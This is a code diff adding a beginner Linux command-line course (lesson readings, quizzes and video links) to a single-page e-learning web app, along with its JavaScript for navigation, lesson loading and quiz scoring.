+        "reading": "<h3>Creating Files and Directories</h3><p>You can easily create new files and folders straight from the terminal.</p><ul><li><strong>mkdir:</strong> Make Directory. e.g., <code>mkdir my_folder</code></li><li><strong>touch:</strong> Create an empty file. e.g., <code>touch myfile.txt</code></li></ul><h3>Copying, Moving, and Removing</h3><ul><li><strong>cp:</strong> Copy files or directories. (Use -r for directories)</li><li><strong>mv:</strong> Move or rename files. e.g., <code>mv old.txt new.txt</code></li><li><strong>rm:</strong> Remove files. e.g., <code>rm file.txt</code></li></ul><div class='code-block'>$ mkdir project<br>$ touch project/notes.txt<br>$ cp project/notes.txt project/backup.txt<br>$ rm project/notes.txt</div><div class='note-box'>\ud83d\udca1 Note: Be extremely careful with the 'rm' command, especially 'rm -rf'. Once deleted, files usually cannot be recovered from the terminal!</div>",
+        "quiz": [
+          {
+            "q": "Which command creates an empty file?",
+            "opts": [
+              "mkdir",
+              "touch",
+              "rm"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 3,
+        "title": "2.2 Viewing File Contents",
+        "vid": "2zJ8E-H7Bq4",
+        "reading": "<h3>Reading Files from the Terminal</h3><p>Linux provides several tools to read the contents of text files without opening a full-fledged text editor.</p><ul><li><strong>cat:</strong> Concatenate and print. Shows the entire file content at once. Great for short files.</li><li><strong>less:</strong> Allows pagination. You can scroll up and down using arrow keys. Press 'q' to quit.</li><li><strong>head:</strong> Outputs the first 10 lines of a file.</li><li><strong>tail:</strong> Outputs the last 10 lines of a file. (Use 'tail -f' to watch a file update in real-time, great for logs!)</li></ul><div class='code-block'>$ cat short_note.txt<br>Hello World!<br>$ tail -n 5 /var/log/syslog</div><div class='note-box'>\ud83d\udca1 Note: If a file is very large, always use 'less' or 'tail' instead of 'cat' to prevent flooding your terminal screen.</div>",
+        "quiz": [
+          {
+            "q": "Which command allows you to view a file page by page and scroll up or down?",
+            "opts": [
+              "cat",
+              "less",
+              "tail"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 4,
+        "title": "3.1 Understanding File Permissions",
+        "vid": "z12qHDEvF60",
+        "reading": "<h3>Linux File Permissions</h3><p>Linux is a multi-user OS. Permissions define who can read, write, or execute a file.</p><p>Permissions are broken down into three categories:</p><ul><li><strong>User (u):</strong> The owner of the file.</li><li><strong>Group (g):</strong> Users who belong to the file's group.</li><li><strong>Others (o):</strong> Everyone else.</li></ul><h3>Changing Permissions with chmod</h3><p>The <strong>chmod</strong> command changes file permissions. Permissions can be represented by letters (r=read, w=write, x=execute) or numbers (4=read, 2=write, 1=execute).</p><div class='code-block'>$ chmod +x script.sh  # Adds execute permission<br>$ chmod 755 script.sh # Owner gets rwx (4+2+1=7), Group/Others get rx (4+1=5)</div><div class='note-box'>\ud83d\udca1 Note: Use 'ls -l' to view the current permissions of files in a directory.</div>",
+        "quiz": [
+          {
+            "q": "In the numeric permission '755', what does the '7' represent?",
+            "opts": [
+              "Read and Write for the Owner",
+              "Read, Write, and Execute for the Owner",
+              "Read and Execute for the Group"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 5,
+        "title": "3.2 Searching for Files and Text",
+        "vid": "5j5cKMB4dFE",
+        "reading": "<h3>Finding Files</h3><p>The <strong>find</strong> command is a powerful tool to search for files in a directory hierarchy.</p><div class='code-block'>$ find /home/user -name \"*.txt\"</div><h3>Searching Text with grep</h3><p>The <strong>grep</strong> command searches for patterns within files. It is arguably one of the most useful commands in Linux.</p><ul><li><strong>grep \"error\" log.txt:</strong> Finds lines containing \"error\".</li><li><strong>grep -i \"error\" log.txt:</strong> Case-insensitive search.</li><li><strong>grep -r \"pattern\" /dir:</strong> Recursively search inside a directory.</li></ul><div class='note-box'>\ud83d\udca1 Note: You can combine 'find' and 'grep' to search for specific text across multiple specific files!</div>",
+        "quiz": [
+          {
+            "q": "Which command is used to search for a specific text pattern inside a file?",
+            "opts": [
+              "find",
+              "grep",
+              "search"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 6,
+        "title": "4.1 Input, Output, and Piping",
+        "vid": "v_1Gq_5L5gA",
+        "reading": "<h3>Standard Input and Output</h3><p>In Linux, programs typically read from Standard Input (stdin) and write to Standard Output (stdout).</p><h3>Redirection</h3><p>You can redirect output to a file using <strong>&gt;</strong> (overwrite) or <strong>&gt;&gt;</strong> (append).</p><div class='code-block'>$ echo \"Hello\" > greeting.txt<br>$ echo \"World\" >> greeting.txt</div><h3>Piping</h3><p>The pipe operator <strong>|</strong> takes the output of one command and passes it as input to another. This allows chaining commands together.</p><div class='code-block'>$ ls -l /var/log | grep \"syslog\"<br>$ cat names.txt | sort | uniq</div><div class='note-box'>\ud83d\udca1 Note: Piping is a core philosophy of Unix/Linux: writing small programs that do one thing well and connecting them together.</div>",
+        "quiz": [
+          {
+            "q": "What does the pipe (|) operator do?",
+            "opts": [
+              "Overwrites a file with output",
+              "Passes the output of one command as input to another",
+              "Runs a command in the background"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 7,
+        "title": "4.2 Process Management",
+        "vid": "zB1Wj_pE1kQ",
+        "reading": "<h3>Monitoring Processes</h3><p>Every running program in Linux is called a <strong>process</strong>. You can view running processes to monitor system health.</p><ul><li><strong>ps:</strong> Snapshot of current processes. (e.g., <code>ps aux</code>)</li><li><strong>top:</strong> Interactive, real-time process viewer. (Press 'q' to quit)</li><li><strong>htop:</strong> A more colorful and user-friendly version of top (often needs to be installed).</li></ul><h3>Managing Processes</h3><p>If a process freezes, you can terminate it using the <strong>kill</strong> command followed by its Process ID (PID).</p><div class='code-block'>$ kill 1234<br>$ kill -9 1234 # Force kill</div><div class='note-box'>\ud83d\udca1 Note: You can run a process in the background by appending an ampersand (&amp;) to the end of your command. e.g., 'sleep 100 &amp;'</div>",
+        "quiz": [
+          {
+            "q": "Which command provides an interactive, real-time view of running processes?",
+            "opts": [
+              "ps",
+              "kill",
+              "top"
+            ],
+            "ans": 2
+          }
+        ]
+      },
+      {
+        "id": 8,
+        "title": "5.1 Archiving and Compressing",
+        "vid": "L88f1-N243M",
+        "reading": "<h3>Working with Tarballs</h3><p>In Linux, archiving (combining multiple files into one) and compressing (reducing file size) are often done together using the <strong>tar</strong> command.</p><ul><li><strong>Create an archive:</strong> <code>tar -cvf archive.tar /folder</code></li><li><strong>Extract an archive:</strong> <code>tar -xvf archive.tar</code></li></ul><h3>Compression</h3><p>To compress archives, we add flags for gzip (z) or bzip2 (j).</p><div class='code-block'>$ tar -czvf backup.tar.gz /home/user/Documents<br>$ tar -xzvf backup.tar.gz</div><div class='note-box'>\ud83d\udca1 Note: The flags stand for: c (create), x (extract), z (gzip), v (verbose - see files processed), f (file).</div>",
+        "quiz": [
+          {
+            "q": "Which flag is used with the 'tar' command to compress the archive using gzip?",
+            "opts": [
+              "-c",
+              "-z",
+              "-v"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 9,
+        "title": "5.2 Package Management",
+        "vid": "Q_p6D3bUoA8",
+        "reading": "<h3>Installing Software</h3><p>Unlike Windows where you download .exe files from websites, Linux relies on <strong>Package Managers</strong> to download, install, and update software from official repositories.</p><h3>Debian/Ubuntu (APT)</h3><p>The Advanced Package Tool (APT) is standard on Debian-based systems.</p><ul><li><strong>Update package list:</strong> <code>sudo apt update</code></li><li><strong>Install a package:</strong> <code>sudo apt install curl</code></li><li><strong>Remove a package:</strong> <code>sudo apt remove curl</code></li></ul><h3>Red Hat/CentOS (YUM/DNF)</h3><p>These systems use <code>yum</code> or <code>dnf</code>.</p><div class='code-block'>$ sudo dnf install git</div><div class='note-box'>\ud83d\udca1 Note: You usually need 'sudo' (superuser do) to install or remove software, as these commands affect the entire system.</div>",
+        "quiz": [
+          {
+            "q": "Which command updates the list of available packages on an Ubuntu/Debian system?",
+            "opts": [
+              "sudo apt update",
+              "sudo yum install",
+              "sudo apt remove"
+            ],
+            "ans": 0
+          }
+        ]
+      },
+      {
+        "id": 10,
+        "title": "6.1 Networking Basics",
+        "vid": "2c7lZ1vIXXI",
+        "reading": "<h3>Network Diagnostics</h3><p>The terminal is perfect for troubleshooting network issues.</p><ul><li><strong>ping:</strong> Tests connectivity to another server. <code>ping google.com</code></li><li><strong>ifconfig / ip addr:</strong> Displays your network interfaces and IP addresses.</li></ul><h3>Downloading Files</h3><p>You can fetch data or download files directly from the web.</p><ul><li><strong>curl:</strong> Fetch web content to the terminal. <code>curl http://example.com</code></li><li><strong>wget:</strong> Download files. <code>wget http://example.com/file.zip</code></li></ul><div class='code-block'>$ ping -c 4 8.8.8.8<br>$ wget https://kernel.org/pub/linux/kernel/v5.x/linux-5.10.tar.xz</div><div class='note-box'>\ud83d\udca1 Note: Press Ctrl+C to stop commands like 'ping' that run continuously by default.</div>",
+        "quiz": [
+          {
+            "q": "Which command is commonly used to download a file directly from the internet via the terminal?",
+            "opts": [
+              "ping",
+              "wget",
+              "ifconfig"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 11,
+        "title": "6.2 Text Editors in the Terminal",
+        "vid": "w9Y6ZfB9A6I",
+        "reading": "<h3>Why Terminal Editors?</h3><p>When working on servers without a GUI, you must edit configuration files directly in the terminal.</p><h3>Nano</h3><p><strong>nano</strong> is a simple, user-friendly editor. It displays shortcuts at the bottom of the screen.</p><div class='code-block'>$ nano config.txt<br># Edit text, then press Ctrl+O to save, and Ctrl+X to exit.</div><h3>Vim</h3><p><strong>vim</strong> is incredibly powerful but has a steep learning curve. It uses 'modes' (Command mode and Insert mode).</p><ul><li>Open file: <code>vim file.txt</code></li><li>Enter Insert Mode: Press <strong>i</strong></li><li>Exit Insert Mode: Press <strong>Esc</strong></li><li>Save and Quit: Type <strong>:wq</strong> and hit Enter.</li></ul><div class='note-box'>\ud83d\udca1 Note: If you ever get stuck in Vim, press 'Esc' multiple times, type ':q!', and press Enter to force quit without saving!</div>",
+        "quiz": [
+          {
+            "q": "In Vim, how do you save your changes and quit the editor?",
+            "opts": [
+              ":q!",
+              ":wq",
+              "Ctrl+X"
+            ],
+            "ans": 1
+          }
+        ]
+      },
+      {
+        "id": 12,
+        "title": "7.1 Basic Bash Scripting",
+        "vid": "tK9Oc6AEnZE",
+        "reading": "<h3>What is a Bash Script?</h3><p>A Bash script is simply a plain text file containing a series of terminal commands. It allows you to automate repetitive tasks.</p><h3>Creating a Script</h3><p>Scripts typically start with a \"shebang\" (<code>#!/bin/bash</code>) to tell the system which interpreter to use.</p><div class='code-block'>#!/bin/bash<br>echo \"Starting backup...\"<br>tar -czvf backup.tar.gz /home/user/Documents<br>echo \"Backup complete!\"</div><h3>Running the Script</h3><p>Before running it, you must make it executable using <code>chmod</code>.</p><div class='code-block'>$ chmod +x backup.sh<br>$ ./backup.sh</div><div class='note-box'>\ud83d\udca1 Note: The './' tells Linux to look for the script in the current directory, rather than in system paths.</div>",
+        "quiz": [
+          {
+            "q": "What is the purpose of the 'shebang' (#!/bin/bash) at the top of a script?",
+            "opts": [
+              "It makes the script run faster",
+              "It acts as a comment for documentation",
+              "It specifies the interpreter that should execute the script"
+            ],
+            "ans": 2
+          }
+        ]
+      }
+    ]
+  }
+];
+
+/* ════════════════════════════════════════
+   APPLICATION STATE & NAVIGATION
+════════════════════════════════════════ */
+let currentCourse = COURSES[0];
+let currentLesson = COURSES[0].lessons[0];
+let curScreen = 'home';
+let userAnswers = {};
+
+function go(name){
+  if(name === curScreen) return;
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen-' + name).classList.add('active');
+  curScreen = name;
+  
+  document.querySelectorAll('.dbtn').forEach(b => b.classList.remove('on'));
+  const activeBtn = document.getElementById('btn-' + name);
+  if(activeBtn) activeBtn.classList.add('on');
+  
+  window.scrollTo(0,0);
+}
+
+/* ════════════════════════════════════════
+   RENDER COURSES (HOME & CATALOG)
+════════════════════════════════════════ */
+function courseCardHtml(c){
+  const thumb = `https://img.youtube.com/vi/${c.vid}/mqdefault.jpg`;
+  return `
+  <div class="cc" onclick="loadCourse(${c.id}); go('course');">
+    <div class="cc-thumb"><img src="${thumb}" alt="${c.title}"/></div>
+    <div class="cc-body">
+      <div class="cc-cat">${c.cat}</div>
+      <div class="cc-title">${c.title}</div>
+      <div class="cc-desc">${c.desc}</div>
+      <div class="cc-meta">
+        <span>📖 ${c.lessonsCount} lessons · ${c.hrs}</span>
+        <span class="bdg ${c.bdg}">${c.level}</span>
+      </div>
+    </div>
+  </div>`;
+}
+
+function renderCourses(list){
+  document.getElementById('home-grid').innerHTML = list.slice(0,3).map(courseCardHtml).join('');
+  document.getElementById('catalog-grid').innerHTML = list.map(courseCardHtml).join('');
+}
+renderCourses(COURSES);
+
+function filterCat(cat, btn){
+  document.querySelectorAll('.ftab, .cat-card').forEach(b => b.classList.remove('on'));
+  if(btn) btn.classList.add('on');
+  
+  if(cat === 'ALL'){
+    renderCourses(COURSES);
+  } else {
+    const filtered = COURSES.filter(c => c.cat.toUpperCase().includes(cat.toUpperCase()));
+    renderCourses(filtered);
+  }
+}
+
+function handleSearch(){
+  const query = document.getElementById('searchInput').value.toLowerCase();
+  const filtered = COURSES.filter(c => 
+    c.title.toLowerCase().includes(query) || 
+    c.cat.toLowerCase().includes(query) || 
+    c.desc.toLowerCase().includes(query)
+  );
+  renderCourses(filtered);
+}
+
+/* ════════════════════════════════════════
+   LOAD COURSE DETAILS & LESSONS
+════════════════════════════════════════ */
+function loadCourse(id){
+  currentCourse = COURSES.find(c => c.id === id) || COURSES[0];
+  currentLesson = currentCourse.lessons[0];
+
+  // Update Course Detail View
+  document.getElementById('cd-cat-crumb').innerText = currentCourse.cat;
+  document.getElementById('cd-title-crumb').innerText = currentCourse.title;
+  document.getElementById('cd-cat-tag').innerText = currentCourse.cat + ' PROGRAMMING';
+  document.getElementById('cd-title').innerText = currentCourse.title;
+  document.getElementById('cd-desc').innerText = currentCourse.desc;
+  document.getElementById('cd-rating').innerText = currentCourse.rating;
+  document.getElementById('cd-lessons-count').innerText = `📖 ${currentCourse.lessonsCount} lessons`;
+  document.getElementById('cd-hrs').innerText = `⏱️ ${currentCourse.hrs}`;
+  document.getElementById('cd-level').innerText = currentCourse.level;
+  document.getElementById('cd-thumb').src = `https://img.youtube.com/vi/${currentCourse.vid}/mqdefault.jpg`;
+
+  // Render Modules List
+  const modulesContainer = document.getElementById('cd-modules-list');
+  modulesContainer.innerHTML = `
+    <div class="mod">
+      <div class="mod-hd">
+        <div>
+          <div class="mod-name">Module 1: Complete Video &amp; Practical Guide</div>
+          <div class="mod-dur">${currentCourse.lessons.length} video lessons · ${currentCourse.hrs}</div>
+        </div>
+        <span>▼</span>
+      </div>
+      <div class="mod-lessons">
+        ${currentCourse.lessons.map((les, idx) => `
+          <div class="lesson-item ${idx === 0 ? 'active-lesson' : ''}" onclick="loadLesson(${les.id}); go('lesson');">
+            <span>▶</span> ${les.title}
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  `;
+
+  // Render Outcomes
+  document.getElementById('cd-outcomes').innerHTML = currentCourse.outcomes.map(o => `<li>${o}</li>`).join('');
+
+  // Pre-load lesson sidebar
+  renderLessonSidebar();
+  loadLesson(0);
+}
+
+function startCurrentCourse(){
+  loadLesson(0);
+  go('lesson');
+}
+
+/* ════════════════════════════════════════
+   LOAD LESSON VIEW (VIDEO, READING, QUIZ)
+════════════════════════════════════════ */
+function loadLesson(lessonId){
+  currentLesson = currentCourse.lessons.find(l => l.id === lessonId) || currentCourse.lessons[0];
+  userAnswers = {};
+
+  // Headers
+  document.getElementById('ls-header-tag').innerText = `${currentCourse.cat} // ${currentLesson.title}`;
+  document.getElementById('ls-title').innerText = currentLesson.title;
+  
+  // Video embed with youtube-nocookie and direct link fallback
+  const embedUrl = `https://www.youtube.com/embed/${currentLesson.vid}?rel=0`;
+  const watchUrl = `https://www.youtube.com/watch?v=${currentLesson.vid}`;
+  
+  document.getElementById('vid-iframe').src = embedUrl;
+  document.getElementById('vid-source').innerText = `Source: ${currentCourse.source}`;
+  document.getElementById('yt-external-link').href = watchUrl;
+
+  // Reading
+  document.getElementById('reading-content').innerHTML = currentLesson.reading;
+
+  // Quiz Questions
+  const qContainer = document.getElementById('quiz-questions-container');
+  qContainer.innerHTML = currentLesson.quiz.map((qObj, qIdx) => `
+    <div class="q-item">
+      <div class="q-text">${qIdx + 1}. ${qObj.q}</div>
+      <div class="q-opts">
+        ${qObj.opts.map((optText, optIdx) => `
+          <div class="q-opt" onclick="selectAnswer(${qIdx}, ${optIdx}, this)">
+            <span class="q-opt-tag">${String.fromCharCode(65 + optIdx)}</span> ${optText}
+          </div>
+        `).join('')}
+      </div>
+    </div>
+  `).join('');
+
+  document.getElementById('qResult').style.display = 'none';
+  renderLessonSidebar();
+  ltab(0); // Default to video tab
+}
+
+function renderLessonSidebar(){
+  document.getElementById('ls-sidebar-title').innerText = currentCourse.title;
+  document.getElementById('ls-sidebar-items').innerHTML = currentCourse.lessons.map(les => `
+    <div class="ls-item ${les.id === currentLesson.id ? 'on' : ''}" onclick="loadLesson(${les.id})">
+      <span>${les.id === currentLesson.id ? '▶' : '✓'}</span> ${les.title}
+    </div>
+  `).join('');
+}
+
+function nextLesson(){
+  const nextId = currentLesson.id + 1;
+  if(nextId < currentCourse.lessons.length){
+    loadLesson(nextId);
+  } else {
+    alert('🎉 Congratulations! You completed all lessons in this course!');
+    go('dashboard');
+  }
+}
+
+/* ════════════════════════════════════════
+   QUIZ INTERACTION & SCORING
+════════════════════════════════════════ */
+function selectAnswer(qIdx, optIdx, el){
+  userAnswers[qIdx] = optIdx;
+  el.parentElement.querySelectorAll('.q-opt').forEach(o => o.classList.remove('selected'));
+  el.classList.add('selected');
+}
+
+function submitQuiz(){
+  let correctCount = 0;
+  const questions = currentLesson.quiz;
+
+  questions.forEach((qObj, qIdx) => {
+    const opts = document.querySelectorAll(`#quiz-questions-container .q-item:nth-child(${qIdx + 1}) .q-opt`);
+    opts.forEach((optEl, optIdx) => {
+      optEl.classList.remove('correct', 'wrong');
+      if(optIdx === qObj.ans){
+        optEl.classList.add('correct');
+      }
+      if(userAnswers[qIdx] === optIdx && userAnswers[qIdx] !== qObj.ans){
+        optEl.classList.add('wrong');
+      }
+    });
+
+    if(userAnswers[qIdx] === qObj.ans){
+      correctCount++;
+    }
+  });
+
+  const pct = Math.round((correctCount / questions.length) * 100);
+  const qResult = document.getElementById('qResult');
+  qResult.style.display = 'block';
+  document.getElementById('qScore').innerText = `${pct}% (${correctCount}/${questions.length} Correct)`;
+  
+  if(pct >= 60){
+    document.getElementById('qMsg').innerText = '✓ Quiz Passed! You can move to the next lesson.';
+  } else {
+    document.getElementById('qMsg').innerText = '✕ Score below 60%. Please review the reading material and try again.';
+  }
+}
+
+/* ════════════════════════════════════════
+   TAB CONTROLS
+════════════════════════════════════════ */
+function ctab(i){
+  document.querySelectorAll('.cstab').forEach((t,j)=>t.classList.toggle('on',i===j));
+  document.querySelectorAll('.cspanel').forEach((p,j)=>p.classList.toggle('on',i===j));
+}
+
+function ltab(i){
+  document.querySelectorAll('.ltab').forEach((t,j)=>t.classList.toggle('on',i===j));
+  document.querySelectorAll('.lpanel').forEach((p,j)=>p.classList.toggle('on',i===j));
+}
+
+// Initial load
+loadCourse(0);
+</script>
+</body>
+</html>
